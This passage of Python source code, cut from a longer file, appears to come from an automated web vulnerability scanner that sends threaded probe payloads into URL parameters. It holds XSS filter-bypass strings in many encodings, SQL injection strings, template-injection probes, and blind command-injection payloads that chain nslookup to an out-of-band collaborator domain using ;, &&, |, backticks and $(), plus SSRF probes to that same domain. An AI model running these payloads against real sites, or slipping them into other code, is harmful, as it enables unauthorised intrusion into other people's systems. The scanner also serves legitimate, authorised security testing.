                            ref_count=ref_temp.count("fuzz")+ref_temp.count("FUZZ")+ref_temp.count("Fuzz")
                            print("\t\t-captured false reflections-\n")

                        elif "testing_dwfer" not in a:
                            ref_count2=ref_temp.count("fuzz")+ref_temp.count("FUZZ")+ref_temp.count("Fuzz")                        
                           
                            if ref_count==ref_count2:
                                print("no special reflections --> skipping")
                                
                                if "parametersMini" in paramdirectory or "parameters100" in paramdirectory :
                                    PL1="' or\'\"'<abhi>"
                                    PL2=" AS INJECTX WHERE 1=1 AND 1=1 <abhi>\"\"ab''ab"
                                    if __name__ =="__main__":
                                    # creating thread
                                        t1 = threading.Thread(target=my_function, args=(PL1,parameter))
                                        t2 = threading.Thread(target=my_function, args=(PL2,parameter))
                                        t1.start()
                                        t2.start()
                                        t1.join()
                                        t2.join()
                                        continue
                                else:
                                    print(" --- skipping --> as parameter list is large! ")
                                    continue
                    #********************************************************



                    #print(Back.BLACK +Fore.CYAN +"method:0 direct test...")
                    #payload="78907890<abhi>\"\"09870987"
                    #my_function()
                    if single_mode:
                        print("\t -Testing Xss simple-")
                        PL1="78907890%3cabhi%3e%22%22ab''ab09870987"
                        PL2="%3cabhi%3e"
                        t1 = threading.Thread(target=my_function, args=(PL1,parameter,))
                        t2 = threading.Thread(target=my_function, args=(PL2,parameter,))
                        t1.start()
                        t2.start()
                        t1.join()
                        t2.join()
                        
                        
                    if enable_xss:
                        print("\t -Testing Xss-")
                        PL1="78907890%3cabhi%3e%22%22ab''ab09870987"
                        PL2="%3cabhi%3e"
                        PL3="%253cabhi%253e%2522%2522ab"
                        PL4="78907890%26lt%3Babhi%26gt%3B%26quot%3B%26quot%3Bab09870987"
                        PL5="78907890a&<abhi>\"\"ab''ab09870987"
                        PL6="78907890a&%3cabhi%3e%22%22ab%27%27ab09870987"
                        PL7="78907890a&%253cabhi%253e%2522%2522ab%2527%2527ab09870987" #paramter inject + double url encodee


                        if __name__ =="__main__":
                            # creating thread

                            t1 = threading.Thread(target=my_function, args=(PL1,parameter,))
                            t2 = threading.Thread(target=my_function, args=(PL2,parameter,))
                            t3 = threading.Thread(target=my_function, args=(PL3,parameter,))
                            t4 = threading.Thread(target=my_function, args=(PL4,parameter,))
                            t5 = threading.Thread(target=my_function, args=(PL5,parameter,))
                            t6 = threading.Thread(target=my_function, args=(PL6,parameter,))
                            t7 = threading.Thread(target=my_function, args=(PL7,parameter,))

                            if thread_limit==7:
                                t1.start()
                                t2.start()
                                t3.start()
                                t4.start()                   
                                t5.start()
                                t6.start()
                                t7.start()
                                t1.join()
                                t2.join()
                                t3.join()
                                t4.join()                   
                                t5.join()
                                t6.join()
                                t7.join()

                            if thread_limit==3:
                                print("\n ... thread 3 ...")
                                t1.start()
                                t2.start()
                                t3.start()                            
                                t1.join()
                                t2.join()
                                t3.join()

                                t4.start()                   
                                t5.start()
                                t6.start()
                                t7.start()
                                t4.join()                   
                                t5.join()
                                t6.join()
                                t7.join()

                            if thread_limit==2:
                                t1.start()
                                t2.start()                            
                                t1.join()
                                t2.join()

                                t3.start()
                                t4.start()
                                t3.join()
                                t4.join()

                                t5.start()
                                t6.start()
                                t5.join()
                                t6.join()

                                t7.start()
                                t7.join()

                            if thread_limit==1:

                                t1.start()                       
                                t1.join()

                                t2.start() 
                                t2.join()

                                t3.start()
                                t3.join()

                                t4.start()
                                t4.join()

                                t5.start()                          
                                t5.join()

                                t6.start()
                                t6.join()

                                t7.start()
                                t7.join()                            




                        PL1="＜abhi＞\"\""
                        PL2="78907890%EF%BC%9C%61%62%68%69%EF%BC%9E%22%22ab09870987"
                        PL3="78907890%C0%BCabhi%C0%BE%C0%A2%C0%A209870987" #utf 8
                        PL4="78907890%E0%80%BCabhi%E0%80%BE%E0%80%A2%E0%80%A2ab09870987" # utf 8 -2
                        PL5="78907890%F0%80%80%BCabhi%F0%80%80%BE%F0%80%80%A2%F0%80%80%A2ab09870987"
                        PL6="78907890%26%2360%3Babhi%26%2362%3B%26%2334%3B%26%2334%3Bab09870987"
                        PL7="78907890%26%23x3C%3B%26%23x61%3B%26%23x62%3B%26%23x68%3B%26%23x69%3B%26%23x3E%3B%26%23x22%3B%26%23x22%3Bab09870987" #html bypass


                        if __name__ =="__main__":
                            # creating thread

                            t1 = threading.Thread(target=my_function, args=(PL1,parameter,))
                            t2 = threading.Thread(target=my_function, args=(PL2,parameter,))
                            t3 = threading.Thread(target=my_function, args=(PL3,parameter,))
                            t4 = threading.Thread(target=my_function, args=(PL4,parameter,))
                            t5 = threading.Thread(target=my_function, args=(PL5,parameter,))
                            t6 = threading.Thread(target=my_function, args=(PL6,parameter,))
                            t7 = threading.Thread(target=my_function, args=(PL7,parameter,))


                            if thread_limit==7:
                                t1.start()
                                t2.start()
                                t3.start()
                                t4.start()                   
                                t5.start()
                                t6.start()
                                t7.start()
                                t1.join()
                                t2.join()
                                t3.join()
                                t4.join()                   
                                t5.join()
                                t6.join()
                                t7.join()

                            if thread_limit==3:
                                t1.start()
                                t2.start()
                                t3.start()                            
                                t1.join()
                                t2.join()
                                t3.join()

                                t4.start()                   
                                t5.start()
                                t6.start()
                                t7.start()
                                t4.join()                   
                                t5.join()
                                t6.join()
                                t7.join()

                            if thread_limit==2:
                                t1.start()
                                t2.start()                            
                                t1.join()
                                t2.join()

                                t3.start()
                                t4.start()
                                t3.join()
                                t4.join()

                                t5.start()
                                t6.start()
                                t5.join()
                                t6.join()

                                t7.start()
                                t7.join()

                            if thread_limit==1:

                                t1.start()                       
                                t1.join()

                                t2.start() 
                                t2.join()

                                t3.start()
                                t3.join()

                                t4.start()
                                t4.join()

                                t5.start()                          
                                t5.join()

                                t6.start()
                                t6.join()

                                t7.start()
                                t7.join()                            


                        #set 3
                        PL1="78907890%26%2360%26%2397%26%2398%26%23104%26%23105%26%2362%26%2334%26%2362%26%2334ab09870987" #method:14 HTML  BYPASS using &#_ :
                        PL2="78907890%5Cu003Cabhi%5Cu003E%5Cu0022%5Cu0022ab09870987" #method:16 unicoded \\u + url encoded  :
                        PL3="78907890%u003Cabhi%u003E%u0022%u0022ab09870987" #method:17 unicoded %u   :
                        PL4="78907890%uff1cabhi%uff1e%22%22ab09870987" # method:18 %uff1c  :
                        PL5="78907890\uFF1Cabhi\uFF1E%22%22\uFE64abhi\uFE65%22%22ab09870987" #method:19 \uFF1C \uFF1E(big < >) & \uFE64 \uFE65(small < >) :
                        PL6="78907890%2bADw-abhi%2bAD4-%2bACI-%2bACI-%2BADw-abhi%2BAD4-%2BACI-%2BACI-ab09870987" #method:20 UTF-7 +ADw- +AD4- +ACI- and url encoded:
                        PL7="78907890💋abhi💛%22%22ab09870987" #method:21 unicode emoji :
                        PL8="%F0%92%80%80%3D%27%27%2C%F0%92%89%BA%3D%21%F0%92%80%80%2B%F0%92%80%80%2C%F0%92%80%83%3D%21%F0%92%89%BA%2B%F0%92%80%80%2C%F0%92%87%BA%3D%F0%92%80%80%2B%7B%7D%2C%F0%92%8C%90%3D%F0%92%89%BA%5B%F0%92%80%80%2B%2B%5D%2C%0A%F0%92%80%9F%3D%F0%92%89%BA%5B%F0%92%88%AB%3D%F0%92%80%80%5D%2C%F0%92%80%86%3D%2B%2B%F0%92%88%AB%2B%F0%92%80%80%2C%F0%92%81%B9%3D%F0%92%87%BA%5B%F0%92%88%AB%2B%F0%92%80%86%5D%2C%F0%92%89%BA%5B%F0%92%81%B9%2B%3D%F0%92%87%BA%5B%F0%92%80%80%5D%0A%2B%28%F0%92%89%BA%2E%F0%92%80%83%2B%F0%92%87%BA%29%5B%F0%92%80%80%5D%2B%F0%92%80%83%5B%F0%92%80%86%5D%2B%F0%92%8C%90%2B%F0%92%80%9F%2B%F0%92%89%BA%5B%F0%92%88%AB%5D%2B%F0%92%81%B9%2B%F0%92%8C%90%2B%F0%92%87%BA%5B%F0%92%80%80%5D%0A%2B%F0%92%80%9F%5D%5B%F0%92%81%B9%5D%28%F0%92%80%83%5B%F0%92%80%80%5D%2B%F0%92%80%83%5B%F0%92%88%AB%5D%2B%F0%92%89%BA%5B%F0%E1%A8%86%3D''%2C%E1%A8%8A%3D!%E1%A8%86%2B%E1%A8%86%2C%E1%A8%8E%3D!%E1%A8%8A%2B%E1%A8%86%2C%E1%A8%82%3D%E1%A8%86%2B%7B%7D%2C%E1%A8%87%3D%E1%A8%8A%5B%E1%A8%86%2B%2B%5D%2C%E1%A8%8B%3D%E1%A8%8A%5B%E1%A8%8F%3D%E1%A8%86%5D%2C%E1%A8%83%3D%2B%2B%E1%A8%8F%2B%E1%A8%86%2C%E1%A8%85%3D%E1%A8%82%5B%E1%A8%8F%2B%E1%A8%83%5D%2C%E1%A8%8A%5B%E1%A8%85%2B%3D%E1%A8%82%5B%E1%A8%86%5D%2B(%E1%A8%8A.%E1%A8%8E%2B%E1%A8%82)%5B%E1%A8%86%5D%2B%E1%A8%8E%5B%E1%A8%83%5D%2B%E1%A8%87%2B%E1%A8%8B%2B%E1%A8%8A%5B%E1%A8%8F%5D%2B%E1%A8%85%2B%E1%A8%87%2B%E1%A8%82%5B%E1%A8%86%5D%2B%E1%A8%8B%5D%5B%E1%A8%85%5D(%E1%A8%8E%5B%E1%A8%86%5D%2B%E1%A8%8E%5B%E1%A8%8F%5D%2B%E1%A8%8A%5B%E1%A8%83%5D%2B%E1%A8%8B%2B%E1%A8%87%2B%22(%E1%A8%86%92%80%86%5D%2B%F0%92%80%9F%2B%F0%92%8C%90%2B%22%28%F0%92%80%80%29%22%29%28%2978907890%3cabhi%3e%22%22ab09870987"


                        if __name__ =="__main__":
                            # creating thread
                            t1 = threading.Thread(target=my_function, args=(PL1,parameter,))
                            t2 = threading.Thread(target=my_function, args=(PL2,parameter,))
                            t3 = threading.Thread(target=my_function, args=(PL3,parameter,))
                            t4 = threading.Thread(target=my_function, args=(PL4,parameter,))
                            t5 = threading.Thread(target=my_function, args=(PL5,parameter,))
                            t6 = threading.Thread(target=my_function, args=(PL6,parameter,))
                            t7 = threading.Thread(target=my_function, args=(PL7,parameter,))
                            t8 = threading.Thread(target=my_function, args=(PL8,parameter,))


                            if thread_limit==7:
                                t1.start()
                                t2.start()
                                t3.start()
                                t4.start()                   
                                t5.start()
                                t6.start()
                                t7.start()
                                t8.start()
                                t1.join()
                                t2.join()
                                t3.join()
                                t4.join()                   
                                t5.join()
                                t6.join()
                                t7.join()
                                t8.join()

                            if thread_limit==3:
                                print("\n ... thread 3 ...")
                                t1.start()
                                t2.start()
                                t3.start() 
                                t8.start()
                                t1.join()
                                t2.join()
                                t3.join()
                                t8.join()

                                t4.start()                   
                                t5.start()
                                t6.start()
                                t7.start()
                                t4.join()                   
                                t5.join()
                                t6.join()
                                t7.join()

                            if thread_limit==2:
                                t1.start()
                                t2.start()                            
                                t1.join()
                                t2.join()

                                t3.start()
                                t4.start()
                                t3.join()
                                t4.join()

                                t5.start()
                                t6.start()
                                t5.join()
                                t6.join()

                                t7.start()
                                t7.join()
                                t8.start()
                                t8.join()

                            if thread_limit==1:

                                t1.start()                       
                                t1.join()

                                t2.start() 
                                t2.join()

                                t3.start()
                                t3.join()

                                t4.start()
                                t4.join()

                                t5.start()                          
                                t5.join()

                                t6.start()
                                t6.join()

                                t7.start()
                                t7.join() 

                                t8.start()
                                t8.join()

                        PL1="PGFiaGk+IiJhYicnIA=="
                        t1 = threading.Thread(target=my_function, args=(PL1,parameter,))
                        t1.start()
                        t1.join()

                    if enable_owasp: 
                        
                        print("\n\t owasp xss filter bypass methods !!: \n") 
                        PL1="78907890%26lt%26gt%26lt;%26gt;%26LT%26GT%26LT;%26GT;%26%2360;%26%2362%26%23060;%26%23062;%26%230060;%26%230062;%26%2300060;%26%2300062;%26%23000060;%26%23000062;%26%230000060;%26%230000062;%26%2360;%26%2362;%26%23060;%26%23062;%26%230060;%26%230062;%26%2300060;%26%2300062;%26%23000060;%26%23000062;%26%230000060;%26%230000062;%26%23x3c;%26%23x3e;%26%23x03c;%26%23x03e;%26%23x003c;%26%23x003e;09870987" 
                        PL2="78907890%26%23x0003c;%26%23x0003e;%26%23x00003c;%26%23x00003e;%26%23x000003c;%26%23x000003e;%26%23x3c;%26%23x3e;%26%23x03c;%26%23x03e;%26%23x003c;%26%23x003e;%26%23x0003c;%26%23x0003e;%26%23x00003c;%26%23x00003e;%26%23x000003c;%26%23x000003e;%26%23X3c;09870987" 
                        PL3="78907890%26%23X3e;%26%23X03c;%26%23X03e;%26%23X003c;%26%23X003e;%26%23X0003c;%26%23X0003e;%26%23X00003c;%26%23X00003e;%26%23X000003c;%26%23X000003e;%26%23X3c;%26%23X3e;%26%23X03c;%26%23X03e;%26%23X003c;%26%23X003e;%26%23X0003c;%26%23X0003e;%26%23X00003c;09870987"  
                        PL4="78907890%26%23X00003e;%26%23X000003c;%26%23X000003e;%26%23x3C;%26%23x3E;%26%23x03C;%26%23x03E;%26%23x003C;%26%23x003E;%26%23x0003C;%26%23x0003E;%26%23x00003C;%26%23x00003E;%26%23x000003C;%26%23x000003E;%26%23x3C;%26%23x3E;%26%23x03C;%26%23x03E;%26%23x003C;09870987"
                        PL5="78907890%26%23x003E;%26%23x0003C;%26%23x0003E;%26%23x00003C;%26%23x00003E;%26%23x000003C;%26%23x000003E;%26%23X3C;%26%23X3E;%26%23X03C;%26%23X03E;%26%23X003C;%26%23X003E;%26%23X0003C;%26%23X0003E;%26%23X00003C;%26%23X00003E;%26%23X000003C;09870987" 
                        PL6="78907890%26%23X000003E;%26%23X3C;%26%23X3E;%26%23X03C;%26%23X03E;%26%23X003C;%26%23X003E;%26%23X0003C;%26%23X0003E;%26%23X00003C;%26%23X00003E;%26%23X000003C;%26%23X000003E;\\x3c\\x3e\\x3C\\x3E\\u003c\\u003e\\u003C\\u003E09870987" 

                        t1 = threading.Thread(target=my_function_owaspbypass, args=(PL1,))
                        t2 = threading.Thread(target=my_function_owaspbypass, args=(PL2,))
                        t3 = threading.Thread(target=my_function_owaspbypass, args=(PL3,))
                        t4 = threading.Thread(target=my_function_owaspbypass, args=(PL4,))
                        t5 = threading.Thread(target=my_function_owaspbypass, args=(PL5,))
                        t6 = threading.Thread(target=my_function_owaspbypass, args=(PL6,))

                        
                        if thread_limit==7:
                            t1.start()
                            t2.start()
                            t3.start()
                            t4.start()                   
                            t5.start()
                            t6.start()
                            t1.join()
                            t2.join()
                            t3.join()
                            t4.join()                   
                            t5.join()
                            t6.join()
                            
                        if thread_limit==3:
                            t1.start()
                            t2.start()
                            t3.start()                            
                            t1.join()
                            t2.join()
                            t3.join()
                            
                            t4.start()                   
                            t5.start()
                            t6.start()
                            t4.join()                   
                            t5.join()
                            t6.join()

                            
                        if thread_limit==2:
                            t1.start()
                            t2.start()                            
                            t1.join()
                            t2.join()
                            
                            t3.start()
                            t4.start()
                            t3.join()
                            t4.join()
                            
                            t5.start()
                            t6.start()
                            t5.join()
                            t6.join()

                            
                        if thread_limit==1:
                            
                            t1.start()                       
                            t1.join()
                            
                            t2.start() 
                            t2.join()
                            
                            t3.start()
                            t3.join()
                            
                            t4.start()
                            t4.join()
                            
                            t5.start()                          
                            t5.join()
                            
                            t6.start()
                            t6.join()
                           
                        
                        

    # **************** SSTI *****************

                    if enable_ssti:
                        print("____SSTI testing___")
                        PL1="78907890{{7*7}}[[7*7]]09870987"
                        PL2="78907890{{%26 7*7 %26}}09870987"
                        PL3="78907890{{7*'7'}}09870987"
                        PL4="78907890<%26= 7 * 7 %26>09870987"
                        PL5="78907890${7*7}09870987"
                        PL6="78907890${{7*7}}09870987"
                        PL7="78907890@(7%2b7)09870987"

                        t1 = threading.Thread(target=my_function_ssti, args=(PL1,))
                        t2 = threading.Thread(target=my_function_ssti, args=(PL2,))
                        t3 = threading.Thread(target=my_function_ssti, args=(PL3,))
                        t4 = threading.Thread(target=my_function_ssti, args=(PL4,))
                        t5 = threading.Thread(target=my_function_ssti, args=(PL5,))
                        t6 = threading.Thread(target=my_function_ssti, args=(PL6,))
                        t7 = threading.Thread(target=my_function_ssti, args=(PL7,))

                        if thread_limit==7:
                            t1.start()
                            t2.start()
                            t3.start()
                            t4.start()                   
                            t5.start()
                            t6.start()
                            t7.start()
                            t1.join()
                            t2.join()
                            t3.join()
                            t4.join()                   
                            t5.join()
                            t6.join()
                            t7.join()

                        elif thread_limit==3:
                            t1.start()
                            t2.start()
                            t3.start()                            
                            t1.join()
                            t2.join()
                            t3.join()

                            t4.start()                   
                            t5.start()
                            t6.start()
                            t7.start()
                            t4.join()                   
                            t5.join()
                            t6.join()
                            t7.join()

                        elif thread_limit==2:
                            t1.start()
                            t2.start()                            
                            t1.join()
                            t2.join()

                            t3.start()
                            t4.start()
                            t3.join()
                            t4.join()

                            t5.start()
                            t6.start()
                            t5.join()
                            t6.join()

                            t7.start()
                            t7.join()

                        elif thread_limit==1:

                            t1.start()                      
                            t1.join()

                            t2.start() 
                            t2.join()

                            t3.start()
                            t3.join()

                            t4.start()
                            t4.join()

                            t5.start()                          
                            t5.join()

                            t6.start()
                            t6.join()

                            t7.start()
                            t7.join()                            




                    #print("method:15 unicoded \\u  :")
                    #payload="78907890\\u003Cabhi\\u003E\\u0022\\u002209870987"
                    #my_function()


                elif paramdirectory!='parameters/parametersMax.txt' or "defaultparam" in Lines2[i]:
                    print("  no reflective values found--> skipping..")
                    
                    if enable_sql:
                        PL1="' or\'\"'<abhi>\"\"ab''ab"
                        PL2=" AS INJECTX WHERE 1=1 AND 1=1 <abhi>\"\"ab''ab"
                        PL3="%F0%92%80%80%3D%27%27%2C%F0%92%89%BA%3D%21%F0%92%80%80%2B\"\"ab''ab%2C%F0%92%80%83%3D%21%F0%92%89%BA%2B%F0%92%80%80%2C%F0%92%87%BA%3D%F0%92%80%80%2B%7B%7D%2C%F0%92%8C%90%3D%F0%92%89%BA%5B%F0%92%80%80%2B%2B%5D%2C%0A%F0%92%80%9F%3D%F0%92%89%BA%5B%F0%92%88%AB%3D%F0%92%80%80%5D%2C%F0%92%80%86%3D%2B%2B%F0%92%88%AB%2B%F0%92%80%80%2C%F0%92%81%B9%3D%F0%92%87%BA%5B%F0%92%88%AB%2B%F0%92%80%86%5D%2C%F0%92%89%BA%5B%F0%92%81%B9%2B%3D%F0%92%87%BA%5B%F0%92%80%80%5D%0A%2B%28%F0%92%89%BA%2E%F0%92%80%83%2B%F0%92%87%BA%29%5B%F0%92%80%80%5D%2B%F0%92%80%83%5B%F0%92%80%86%5D%2B%F0%92%8C%90%2B%F0%92%80%9F%2B%F0%92%89%BA%5B%F0%92%88%AB%5D%2B%F0%92%81%B9%2B%F0%92%8C%90%2B%F0%92%87%BA%5B%F0%92%80%80%5D%0A%2B%F0%92%80%9F%5D%5B%F0%92%81%B9%5D%28%F0%92%80%83%5B%F0%92%80%80%5D%2B%F0%92%80%83%5B%F0%92%88%AB%5D%2B%F0%92%89%BA%5B%F0%E1%A8%86%3D''%2C%E1%A8%8A%3D!%E1%A8%86%2B%E1%A8%86%2C%E1%A8%8E%3D!%E1%A8%8A%2B%E1%A8%86%2C%E1%A8%82%3D%E1%A8%86%2B%7B%7D%2C%E1%A8%87%3D%E1%A8%8A%5B%E1%A8%86%2B%2B%5D%2C%E1%A8%8B%3D%E1%A8%8A%5B%E1%A8%8F%3D%E1%A8%86%5D%2C%E1%A8%83%3D%2B%2B%E1%A8%8F%2B%E1%A8%86%2C%E1%A8%85%3D%E1%A8%82%5B%E1%A8%8F%2B%E1%A8%83%5D%2C%E1%A8%8A%5B%E1%A8%85%2B%3D%E1%A8%82%5B%E1%A8%86%5D%2B(%E1%A8%8A.%E1%A8%8E%2B%E1%A8%82)%5B%E1%A8%86%5D%2B%E1%A8%8E%5B%E1%A8%83%5D%2B%E1%A8%87%2B%E1%A8%8B%2B%E1%A8%8A%5B%E1%A8%8F%5D%2B%E1%A8%85%2B%E1%A8%87%2B%E1%A8%82%5B%E1%A8%86%5D%2B%E1%A8%8B%5D%5B%E1%A8%85%5D(%E1%A8%8E%5B%E1%A8%86%5D%2B%E1%A8%8E%5B%E1%A8%8F%5D%2B%E1%A8%8A%5B%E1%A8%83%5D%2B%E1%A8%8B%2B%E1%A8%87%2B%22(%E1%A8%86%92%80%86%5D%2B%F0%92%80%9F%2B%F0%92%8C%90%2B%22%28%F0%92%80%80%29%22%29%28%and %2522%2520%2521 %253cabhi%253e"
                        if __name__ =="__main__":
                            # creating thread
                            t1 = threading.Thread(target=my_function, args=(PL1,parameter,))
                            t2 = threading.Thread(target=my_function, args=(PL2,parameter,))
                            t3 = threading.Thread(target=my_function, args=(PL3,parameter,))
                            t1.start()
                            t2.start()
                            t3.start()
                            t1.join()
                            t2.join()
                            t3.join()
                else:
                     print(" no reflections --- skipping --> as parameter list is large! ")
                     

                #blind rce using collaborator ******************      ******************     ***********************
                if len(user_in)!=0:
                    value="1"
                    def rcepayload(cmd,user_in):
                        print("************************************"*2)
                        PL1=(cmd+' '+user_in)
                        PL2=(value+" ; "+cmd+' '+user_in+' ;')
                        PL3=(value+" %26%26 "+cmd+' '+user_in+' %26%26')
                        PL4=(value+" | "+cmd+" "+user_in+' |')
                        PL5=(value+" || "+cmd+" "+user_in+' ||')
                        PL6=(value+" `"+cmd+" "+user_in+"`")
                        PL7=(value+" $("+cmd+" "+user_in+")")
                        t1 = threading.Thread(target=my_function_rce, args=(PL1,))
                        t2 = threading.Thread(target=my_function_rce, args=(PL2,))
                        t3 = threading.Thread(target=my_function_rce, args=(PL3,))
                        t4 = threading.Thread(target=my_function_rce, args=(PL4,))
                        t5 = threading.Thread(target=my_function_rce, args=(PL5,))
                        t6 = threading.Thread(target=my_function_rce, args=(PL6,))
                        t7 = threading.Thread(target=my_function_rce, args=(PL7,))

                        if thread_limit==7:
                            t1.start()
                            t2.start()
                            t3.start()
                            t4.start()                   
                            t5.start()
                            t6.start()
                            t7.start()
                            t1.join()
                            t2.join()
                            t3.join()
                            t4.join()                   
                            t5.join()
                            t6.join()
                            t7.join()

                        elif thread_limit==3:
                            t1.start()
                            t2.start()
                            t3.start()                            
                            t1.join()
                            t2.join()
                            t3.join()

                            t4.start()                   
                            t5.start()
                            t6.start()
                            t7.start()
                            t4.join()                   
                            t5.join()
                            t6.join()
                            t7.join()

                        elif thread_limit==2:
                            t1.start()
                            t2.start()                            
                            t1.join()
                            t2.join()

                            t3.start()
                            t4.start()
                            t3.join()
                            t4.join()

                            t5.start()
                            t6.start()
                            t5.join()
                            t6.join()

                            t7.start()
                            t7.join()

                        elif thread_limit==1:

                            t1.start()                      
                            t1.join()

                            t2.start() 
                            t2.join()

                            t3.start()
                            t3.join()

                            t4.start()
                            t4.join()

                            t5.start()                          
                            t5.join()

                            t6.start()
                            t6.join()

                            t7.start()
                            t7.join()                            


# *************.    *********************.     **********************
                    if enable_rce:
                        print("\033[4mFiring payloads for command injection:\033[0m\n")

                        #********************
                        cmd="nslookup"
                        rcepayload(cmd,"bynslookup"+str(c)+"."+str(ID)+"."+user_in) #launching rce function

                       #********************
                        cmd="ping"
                        user_in2="byping"+str(c)+"."+user_in
                        #rcepayload(cmd,user_in2)



                        #********************
        #                cmd="curl"
        #                rcepayload(cmd,"crl."+user_in)

                        #********************
            #            cmd="start"
             #           rcepayload(cmd,user_in)


                        #********************** ssrf **********using same rce func ****************
                    print("************************************"*2)
                    print(".  ssrf   .")
                    PL7="https://direct"+str(c)+"a"+str(c2)+"."+str(ID)+"."+user_in                
                    t7 = threading.Thread(target=my_function_rce, args=(PL7,))                
                    t7.start()                 
                    #t7.join()

                    
                    with open('xsslogabhi/temp_stats/'+str(ID)+'.abhi','a') as ID2:
                        ID2.write("\n"+str(c)+"- "+str(line))
        
            except requests.exceptions.RequestException as cE:
                try:
                    print("\ttesting wheather network connection is there...")
                    req=requests.get("https://www.google.com")
                except:
                    print("\tplease check Network connection ")
                    break
                print("\t..network connection is good ..")
                continue
                



            except requests.exceptions.Timeout as e:
                write_error()
                print("\u001b[31;1mOOPS!! Timeout Error.\u001b[0m")
                if "defaultparam" in Lines2[i]:
                    reduce_line() 
                continue
            except requests.exceptions.HTTPError as err:
                write_error()
                print(f"\u001b[31;1m {err}. \u001b[0m")
                if "defaultparam" in Lines2[i]:
                    reduce_line() 
                continue               

            #************************* SQL error testing ***************************

                # removed . xxxx xxx. xxx xxx. xx x 

            #***********************************************************************

            

    
        print("................ current url scan completed with parameters ✅ ............")
        #reduce_line()
        
        #**** saving current count *****
        with open('xsslogabhi/resume_stats/'+fn+'.'+userin2,'w') as ID1:
            ID1.write(str(c))       
#*********************************** exceptions *********************************** 
    except requests.exceptions.RequestException as cE:

        try:
            print("\ttesting wheather network connection is there...")
            req=requests.get("https://www.google.com")
        except:
            print("\tplease check Network connection ")
            break
        print("\t..network connection is good..")
        continue
  

    except requests.exceptions.Timeout as e:
        write_error()
        print("\u001b[31;1mOOPS!! Timeout Error.\u001b[0m") 
        continue
    except requests.exceptions.HTTPError as err:
        write_error()
        print(f"\u001b[31;1m {err}. \u001b[0m")
        if "defaultparam" in Lines2[i]:
            reduce_line() 
        continue
#    except:
#        write_error()
#        print("sorry i think coding error or something strange.. \n\t\t\t-abhishek dirisipo !!!",Fore.YELLOW +" skipping-->")     
#        continue
#        reduce_line()
print("************************ dude ! the scan is completed :) *********************************")

